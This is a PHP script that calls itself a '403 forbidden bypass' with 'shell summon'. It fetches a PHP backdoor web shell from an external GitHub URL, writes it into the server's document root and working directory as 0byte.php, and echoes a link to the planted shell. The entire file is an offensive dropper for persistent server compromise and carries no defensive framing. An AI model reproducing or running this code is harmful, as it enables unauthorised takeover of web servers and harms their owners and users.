<?php
/*
	403 FORBIDDEN BYPASS
	WITH BACKDOOR RECALL / SHELL SUMMON
*/
$source = "https://raw.githubusercontent.com/zerobyte-id/PHP-Backdoor/master/0byt3m1n1/0byt3m1n1.php";
$name = "0byte.php";

function _doEvil($name, $file) {
	$filename = $name;
	$getFile = file_get_contents($file);
	$rootPath = $_SERVER['DOCUMENT_ROOT'].DIRECTORY_SEPARATOR;
	$toRootFopen = fopen("$rootPath/$filename",'w');
	$toRootExec = fwrite($toRootFopen, $getFile);
	$rootShellUrl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]"."/$filename";
	$realPath = getcwd().DIRECTORY_SEPARATOR;
	$toRealFopen = fopen("$realPath/$filename",'w');
	$toRealExec = fwrite($toRealFopen, $getFile);
	$realShellUrl = $_SERVER['HTTPS'] ? "https" : "http" . "://$_SERVER[HTTP_HOST]".dirname($_SERVER[REQUEST_URI])."/$filename";
	echo "<center>";
	if($toRootExec) {
		if(file_exists($rootPath."$filename")) {
			echo "<h1><font color=\"#00FF00\">[OK!] <a href=\"$rootShellUrl\" target=\"_blank\">$rootShellUrl</a></font></h1>";
		}
		else { 
			echo "<h1><font color=\"red\">$rootPath$filename<br>Doesn't exist!</font>Try with another method!</h1>";
		}
	}
	else {
		if($toRealExec) {
			if(file_exists($realPath."$filename")) {
				echo "<h1><font color=\"#00FF00\">[OK!] <a href=\"$realShellUrl\" target=\"_blank\">$realShellUrl</a></font></h1>";
			}
			else { 
				echo "<h1><font color=\"red\">FAILED!</font></h1>";
			}
		}
	}
	echo "</center>";
}
_doEvil($name, $source);
?>  
